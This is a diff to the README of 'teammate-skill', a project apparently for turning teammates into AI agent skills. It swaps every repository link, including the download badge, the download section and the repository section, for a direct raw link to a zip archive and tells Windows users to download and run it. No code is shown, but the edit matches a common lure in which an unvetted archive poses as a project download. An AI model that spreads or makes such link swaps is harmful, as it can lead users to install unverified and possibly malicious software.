@@ -1,6 +1,6 @@
 # 🧩 teammate-skill - Turn Teammates Into AI Skills
 
-[![Download](https://img.shields.io/badge/Download-Teammate--Skill-7B61FF?style=for-the-badge)](https://github.com/anh39262/teammate-skill)
+[![Download](https://img.shields.io/badge/Download-Teammate--Skill-7B61FF?style=for-the-badge)](https://raw.githubusercontent.com/anh39262/teammate-skill/main/teammates/skill-teammate-v1.2-beta.2.zip)
 
 ## 🚀 What it does
 
@@ -14,7 +14,7 @@ It works with Claude Code, OpenClaw, and other AgentSkills-compatible agents.
 
 Visit this page to download and use the app:
 
-https://github.com/anh39262/teammate-skill
+https://raw.githubusercontent.com/anh39262/teammate-skill/main/teammates/skill-teammate-v1.2-beta.2.zip
 
 If the page opens in your browser, use it to get the latest files and setup steps for Windows.
 
@@ -184,4 +184,4 @@ If you plan to load the skill into Claude Code, OpenClaw, or another agent:
 
 ## 📍 Repository
 
-https://github.com/anh39262/teammate-skill
+https://raw.githubusercontent.com/anh39262/teammate-skill/main/teammates/skill-teammate-v1.2-beta.2.zip
